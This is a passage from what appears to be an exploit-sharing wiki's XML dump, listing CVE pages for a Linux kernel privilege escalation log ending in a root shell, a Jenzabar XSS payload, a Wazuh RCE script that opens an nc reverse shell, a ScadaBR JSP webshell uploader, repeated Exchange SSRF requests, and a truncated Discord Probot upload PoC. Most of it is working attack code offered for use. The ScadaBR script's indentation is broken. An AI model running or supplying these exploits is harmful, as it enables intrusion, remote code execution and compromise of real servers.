[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

==視頻==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


==參考==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ggearuhyismvtkioh3esjbg9bxvjjf4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26723 Jenzabar 9.2.2 XSS漏洞</title>
    <ns>0</ns>
    <id>3218</id>
    <revision>
      <id>3755</id>
      <timestamp>2021-05-31T03:52:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Jenzabar 9.2.2 - 'query' Reflected XSS. # Date: 2021–02–06 # Exploit Author: y0ung_dst # Vendor Homepage: https://jenzabar.com # Version: Jenzabar..."</comment>
      <origin>3755</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="885" sha1="19uuun5nboxvuyet6bi5d3uubbgoy6j" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Jenzabar 9.2.2 - 'query' Reflected XSS.
# Date: 2021–02–06
# Exploit Author: y0ung_dst
# Vendor Homepage: https://jenzabar.com
# Version: Jenzabar — v9.2.0-v9.2.1-v9.2.2 (and maybe other versions)
# Tested on: Windows 10
# CVE : CVE-2021–26723


-Description:
  A Reflected Cross-site scripting (XSS) vulnerability in Jenzabar v9.2.0 through 9.2.2. Attacker could inject web script or HTML via the query parameter (aka the Search Field). To exploit the vulnerability, someone must click the link.

-Payload used:
  "&gt;&lt;script&gt;alert(1)&lt;/script&gt;

-Example :
  https://localhost/ics?tool=search&amp;query="&gt;&lt;script&gt;alert(1)&lt;/script&gt;

-Steps to reproduce:
  1. Open a website that use Jenzabar v9.2.0 through 9.2.2.
  2. In the Search Field, enter anything.
  3. Edit the query by replacing the text with the payload.
  4. Press Enter to trigger the alert.
&lt;/pre&gt;</text>
      <sha1>19uuun5nboxvuyet6bi5d3uubbgoy6j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26814 Wazuh Manager 代碼執行漏洞</title>
    <ns>0</ns>
    <id>2540</id>
    <revision>
      <id>3037</id>
      <timestamp>2021-05-22T02:23:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Wazuh Manager v.4.0.0-4.0.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; # Exploit Title: Wazuh 4.0.3 API RCE # Author: WickdDavid (Davide Meacci) # Date: 2021-01-01 # Vendor..."</comment>
      <origin>3037</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4146" sha1="6s8orcap0n1xo5zocmp84x7o238yd1o" xml:space="preserve">==影響版本==
&lt;pre&gt;
Wazuh Manager v.4.0.0-4.0.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
# Exploit Title: Wazuh 4.0.3 API RCE
# Author: WickdDavid (Davide Meacci)
# Date: 2021-01-01
# Vendor Homepage: https://github.com/wazuh/wazuh
# Version : 4.0.3


import requests
import sys
import argparse
import time
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


parser = argparse.ArgumentParser(description='Wazuh-manager authenticated RCE by WickdDavid')
parser.add_argument('-user', dest='username',required=True,
                    help='wazuh API username')
parser.add_argument('-pwd', dest='password',required=True,
                    help='wazuh API password')
parser.add_argument('-lip', dest='srcip',required=True,
                    help='listening server')
parser.add_argument('-lport', dest='srcport',required=True,
                    help='listening port')
parser.add_argument('-tip', dest='destip',required=True,
                    help='target server ip (wazuh API)')
parser.add_argument('-tport', dest='destport',required=True,
                    help='target server port (wazuh API)')


args = parser.parse_args()

# executed payload may be changed here

exec_payload = """
import os #:l
os.system("nc %s %s -e /bin/sh") #:l
""" % (args.srcip, args.srcport)


config_payload = { "drop_privileges": False }


proxies = {
	"http":"http://127.0.0.1:8080",
	"https":"https://127.0.0.1:8080"
}

target = "https://%s:%s" % (args.destip,args.destport)
auth_token = ""
path_traversal = "etc/lists/../../../../.."
headers = {}

# step 1 - obtaining auth token

r = requests.get("%s/security/user/authenticate?raw=true" % target, auth=(args.username, args.password),verify=False)

if(r.status_code == 200):
    auth_token = r.text
    headers["Authorization"] = "Bearer %s" % auth_token
else:
    print("[!] No auth code recovered. Check username and password")
    exit(1)

# step 2 - Privilege Escalation on API (not implemented)


# step 3 - Save files to be restored later

file_to_overwrite = "/var/ossec/api/scripts/wazuh-apid.py"
print("[+] Saving files to restore later...")
r = requests.get("%s/manager/files?path=%s%s" % (target,path_traversal,file_to_overwrite), headers = headers, verify=False)
f = open("backup.py","w")
f.write(json.loads(r.text)["contents"])
f.close()
time.sleep(1)

# step 4 - Local Privilege Escalation 

print("[+] Changing API config to run as root...")
r = requests.put("%s/manager/api/config" % target, headers = headers, json = config_payload, verify=False)
time.sleep(1)

# step 5 - Restart server (now api service runs as root) 

print("[+] Restarting server...")
r = requests.put("%s/manager/restart?wait_for_complete=true" % target, headers = headers,verify=False)
#print(r.text)

data = {"title":"Bad Request"}
while "title" in data and "Bad request" in data["title"]:
    time.sleep(5)
    try:
        r = requests.get("%s/manager/status" % target, headers = headers, verify=False)
        #print(r.text)
        data = json.loads(r.text)
    except:
        continue

# step 6 - Overwrite /var/ossec/api/scripts/wazuh-apid.py with malicious python payload

print("[+] Uploading payload...")
r = requests.put("%s/manager/files?path=%s%s&amp;overwrite=true" % (target,path_traversal,file_to_overwrite), headers = headers, data = exec_payload, verify=False)
#print(r.text)
time.sleep(1)

# step 7 - Restart server (now malicious payload will be run by the server)


print("[+] Restarting API service for the last time...")
r = requests.put("%s/manager/restart?wait_for_complete=true" % target, headers = headers,verify=False)
#print(r.text)

data = {"title":"Bad Request"}
while "title" in data and "Bad request" in data["title"]:
    time.sleep(5)
    try:
        r = requests.get("%s/manager/status" % target, headers = headers, verify=False)
        #print(r.text)
        data = json.loads(r.text)
    except:
        continue


print("[+] Payload executed, check your shell now.")
print("[+] Remember to restore changed file (check local backup file)")
&lt;/pre&gt;

==Github==
https://github.com/WickdDavid/CVE-2021-26814</text>
      <sha1>6s8orcap0n1xo5zocmp84x7o238yd1o</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26828 ScadaBR 1.0 / 1.1CE Windows Shell 上傳漏洞</title>
    <ns>0</ns>
    <id>2372</id>
    <revision>
      <id>2854</id>
      <timestamp>2021-05-14T01:55:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python  # Exploit Title: Authenticated Arbitrary File Upload (Remote Code Execution) # Google Dork: N/A # Date: 03/2021 # Exploit Author: Fellipe Oliv..."</comment>
      <origin>2854</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6777" sha1="cqaw8bcmvte3rkwr1ogd65hjabl2xr9" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python

# Exploit Title: Authenticated Arbitrary File Upload (Remote Code Execution)
# Google Dork: N/A
# Date: 03/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.scadabr.com.br/ 
# Software Link: https://www.scadabr.com.br/ 
# Version: ScadaBR 1.0, ScadaBR 1.1CE and ScadaBR 1.0 for Linux
# Tested on: Windows7, Windows10
# CVE : CVE-2021-26828

import requests,sys,time


if len(sys.argv) &lt;=4:
    print('[x] Missing arguments ... ')
    print('[&gt;] Usage: python WinScada_RCE.py &lt;TargetIp&gt; &lt;TargetPort&gt; &lt;User&gt; &lt;Password&gt;')
    print('[&gt;] Example: python WinScada_RCE.py 192.168.1.24 8080 admin admin')
    sys.exit(0)
else:  
    time.sleep(1)


host = sys.argv[1]
port = sys.argv[2]
user = sys.argv[3]
passw = sys.argv[4]

flag = False
LOGIN = 'http://'+host+':'+port+'/ScadaBR/login.htm'
PROTECTED_PAGE = 'http://'+host+':'+port+'/ScadaBR/view_edit.shtm'


banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \______   \______   \      |
|   \_____  \_/ ___\\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  &gt;____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    &gt; ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload (CVE-2021-26828)  |
|    &gt; Exploit Author : Fellipe Oliveira            |
|    &gt; Exploit for Windows Systems                                  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

def main():
    payload = {
        'username': user,
        'password': passw
    }

    print(banner)
    time.sleep(2)
   
    with requests.session() as s:
      s.post(LOGIN, data=payload)
  response = s.get(PROTECTED_PAGE)

        print("[+] Trying to authenticate "+LOGIN+"...")
  if response.status_code == 200:
      print("[+] Successfully authenticated! :D~\n")
      time.sleep(2)
  else:
      print("[x] Authentication failed :(")
            sys.exit(0)

  burp0_url = "http://"+host+":"+port+"/ScadaBR/view_edit.shtm"
  burp0_cookies = {"JSESSIONID": "66E47DFC053393AFF6C2D5A7C15A9439"}
  burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------6150838712847095098536245849", "Origin": "http://"+host+":"+port+"/", "Connection": "close", "Referer": "http://"+host+":"+port+"/ScadaBR/view_edit.shtm", "Upgrade-Insecure-Requests": "1"}
  burp0_data = "-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.name\"\r\n\r\n\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.xid\"\r\n\r\nGV_218627\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"backgroundImageMP\"; filename=\"win_cmd.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;\n&lt;%\n%&gt;\n&lt;HTML&gt;&lt;BODY&gt;\nCommands with JSP\n&lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;\n&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;\n&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;\n&lt;/FORM&gt;\n&lt;pre&gt;\n&lt;%\nif (request.getParameter(\"cmd\") != null) {\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"&lt;BR&gt;\");\n    Process p;\n    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\n    }\n    else{\n        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    }\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n    out.println(disr);\n    disr = dis.readLine();\n    }\n}\n%&gt;\n&lt;/pre&gt;\n&lt;/BODY&gt;&lt;/HTML&gt;\n\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload image\r\n-----------------------------6150838712847095098536245849\r\nContent-Disposition: form-data; name=\"view.anonymousAccess\"\r\n\r\n0\r\n-----------------------------6150838712847095098536245849--\r\n"
  getdata = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

  print('[&gt;] Attempting to upload .jsp Webshell...')
  time.sleep(1)
        print('[&gt;] Verifying shell upload...\n')
  time.sleep(2)
  
  if getdata.status_code == 200:
      print('[+] Upload Successfuly!')
      
      for num in range(1,500):      
        PATH = 'http://'+host+':'+port+'/ScadaBR/uploads/%d.jsp' % (num)
                find = s.get(PATH)

                if find.status_code == 200:  
                    print('[+] Webshell Found in: http://'+host+':'+port+'/ScadaBR/uploads/%d.jsp' % (num))
        flag = True
                    print('[&gt;] Spawning fake shell...') 
                    time.sleep(3)                    

          while flag:
                        param = raw_input("# ")
                  burp0_url = "http://"+host+":"+port+"/ScadaBR/uploads/%d.jsp?cmd=%s" % (num,param)
                        burp0_cookies = {"JSESSIONID": "4FCC12402B8389A64905F4C8272A64B5"}
                        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://"+host+":"+port+"/ScadaBR/uploads/%d.jsp?cmd=%s", "Upgrade-Insecure-Requests": "1"}
                        send = s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)  
                   clean = send.text.replace('&lt;pre&gt;', '').replace('&lt;FORM METHOD=', '').replace('&lt;HTML&gt;&lt;BODY&gt;', '').replace('"GET" NAME="myform" ACTION=""&gt;', '').replace('Commands with JSP', '').replace('&lt;INPUT TYPE="text" NAME="cmd"&gt;', '').replace('&lt;INPUT TYPE="submit" VALUE="Send"&gt;', '').replace('&lt;/FORM&gt;', '').replace('&lt;BR&gt;', '').replace('&lt;/pre&gt;', '').replace('&lt;/BODY&gt;&lt;/HTML&gt;', '')
      print(clean)

            elif num == 499:
                    print('[x] Webshell not Found')
                    
  else:
      print('Reason:'+getdata.reason+' ')     
      print('Exploit Failed x_x')


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>cqaw8bcmvte3rkwr1ogd65hjabl2xr9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞</title>
    <ns>0</ns>
    <id>131</id>
    <revision>
      <id>214</id>
      <timestamp>2021-03-08T05:27:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「&lt;languages /&gt;  &lt;translate&gt; ==漏洞簡介== Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exc…」的新頁面</comment>
      <origin>214</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="729" sha1="ermx20jbywde5arl42dzbma76vqgp8o" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞簡介==
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。

&lt;/translate&gt;

&lt;translate&gt;
==影響範圍==
&lt;/translate&gt;

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>ermx20jbywde5arl42dzbma76vqgp8o</sha1>
    </revision>
    <revision>
      <id>215</id>
      <parentid>214</parentid>
      <timestamp>2021-03-08T05:27:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>已標記此版本用來翻譯</comment>
      <origin>215</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="751" sha1="5zdht31sh885bc30py100o4iq82o0z1" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。

&lt;/translate&gt;

&lt;translate&gt;
==影響範圍== &lt;!--T:2--&gt;
&lt;/translate&gt;

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>5zdht31sh885bc30py100o4iq82o0z1</sha1>
    </revision>
    <revision>
      <id>219</id>
      <parentid>215</parentid>
      <timestamp>2021-03-08T05:27:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>219</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="757" sha1="o1o529xv7liza47ah0q6nlm6j3jipfu" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。

&lt;/translate&gt;

&lt;translate&gt;
==影響範圍== &lt;!--T:2--&gt;
&lt;/translate&gt;

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg|400px]]</text>
      <sha1>o1o529xv7liza47ah0q6nlm6j3jipfu</sha1>
    </revision>
    <revision>
      <id>335</id>
      <parentid>219</parentid>
      <timestamp>2021-03-11T10:07:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>335</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="755" sha1="axwn93gphlxf8vbd6x3dwerstr6qz0t" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。

&lt;/translate&gt;

&lt;translate&gt;
==影響範圍== &lt;!--T:2--&gt;
&lt;/translate&gt;

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[File:Ssrf.jpg|400px]]</text>
      <sha1>axwn93gphlxf8vbd6x3dwerstr6qz0t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞/en</title>
    <ns>0</ns>
    <id>139</id>
    <revision>
      <id>224</id>
      <timestamp>2021-03-08T05:33:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「CVE-2021-26855-Exchange Server SSRF vulnerability」的新頁面</comment>
      <origin>224</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="726" sha1="onk93m57q1gqgq7bc5k3lzjd5z44rgm" xml:space="preserve">&lt;languages /&gt;

==Introduction to Vulnerability==
Exchange server-side request forgery (SSRF) vulnerability, an attacker exploiting this vulnerability can send arbitrary HTTP requests and authenticate through Exchange Server.


==Scope of influence==

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>onk93m57q1gqgq7bc5k3lzjd5z44rgm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞/uk</title>
    <ns>0</ns>
    <id>315</id>
    <revision>
      <id>472</id>
      <timestamp>2021-03-19T11:22:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Сфера впливу =="</comment>
      <origin>472</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="876" sha1="895b4j4n4yb0r0w48i3t3c9bwm8y8t7" xml:space="preserve">&lt;languages /&gt;

== Вступ до вразливості ==
Вразливість підробки Exchange на стороні сервера (SSRF). Зловмисник, який використовує цю вразливість, може надсилати довільні HTTP-запити та автентифікуватися через Exchange Server.


== Сфера впливу ==

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>895b4j4n4yb0r0w48i3t3c9bwm8y8t7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞/yue</title>
    <ns>0</ns>
    <id>4204</id>
    <revision>
      <id>4836</id>
      <timestamp>2021-06-12T09:20:42Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==漏洞簡介== Exchange服務器端請求偽造（SSRF）漏洞，利用呢個漏洞嘅攻擊者可以發送任意HTTP請求並通過Exchange Server進行身份驗證。"</comment>
      <origin>4836</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="682" sha1="9c7y7qvgx7t8vl08dzll679hwh8mely" xml:space="preserve">&lt;languages /&gt;

==漏洞簡介==
Exchange服務器端請求偽造（SSRF）漏洞，利用呢個漏洞嘅攻擊者可以發送任意HTTP請求並通過Exchange Server進行身份驗證。


==影響範圍==

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>9c7y7qvgx7t8vl08dzll679hwh8mely</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3088</id>
    <revision>
      <id>3588</id>
      <timestamp>2021-05-26T18:24:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-26855 - Exchange Server SSRF漏洞"</comment>
      <origin>3588</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="679" sha1="7dfooy3y4cor1cerbmwnv7bmd9uti1g" xml:space="preserve">&lt;languages /&gt;

==漏洞簡介==
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。


==影響範圍==

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>7dfooy3y4cor1cerbmwnv7bmd9uti1g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26855 - Exchange Server SSRF漏洞/zh-tw</title>
    <ns>0</ns>
    <id>135</id>
    <revision>
      <id>220</id>
      <timestamp>2021-03-08T05:28:10Z</timestamp>
      <contributor>
        <username>FuzzyBot</username>
        <id>11</id>
      </contributor>
      <comment>正在更新來源頁面以與新版本相符</comment>
      <origin>220</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="679" sha1="7dfooy3y4cor1cerbmwnv7bmd9uti1g" xml:space="preserve">&lt;languages /&gt;

==漏洞簡介==
Exchange服務器端請求偽造（SSRF）漏洞，利用此漏洞的攻擊者能夠發送任意HTTP請求並通過Exchange Server進行身份驗證。


==影響範圍==

Microsoft Exchange Server: 2010

Microsoft Exchange Server: 2013

Microsoft Exchange Server: 2016

Microsoft Exchange Server: 2019



==SSRF==
&lt;pre&gt;
GET /owa/auth/x.js HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
Accept-Language: en
Connection: close
&lt;/pre&gt;

[[檔案:Ssrf.jpg]]</text>
      <sha1>7dfooy3y4cor1cerbmwnv7bmd9uti1g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26918 Discord Probot 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>3132</id>
    <revision>
      <id>3635</id>
      <timestamp>2021-05-30T03:00:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Discord Probot - Unrestricted File Upload  # Google Dork: N/A # Date: 2021-02-08 # Exploit Author: ThelastVvV # Vendor Homepage:probot.io # Version:Vers..."</comment>
      <origin>3635</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1705" sha1="kqgtw88kimnzrxiw80mqe5rpqn4rsee" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Discord Probot - Unrestricted File Upload 
# Google Dork: N/A
# Date: 2021-02-08
# Exploit Author: ThelastVvV
# Vendor Homepage:probot.io
# Version:Version 2021
# Tested on: Debian 5.7.10-1parrot2
# CVE:CVE-2021-26918


About:
Probot is a discord very customizable multipurpose bot for welcome image, In-depth logs, Social commands, Music, Moderation and many more ...

# Description:

The attacker can acces to probot dashboard and use image uploader in the welcomer tab , the attacl can upload many file types  due the issues of unrestricted file uploads which can be bypassed by changing multipart/form-data POST request with a specially-crafted filename or mime type.

# PoC:


POST / HTTP/1.1
Host: uploader.probot.io
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
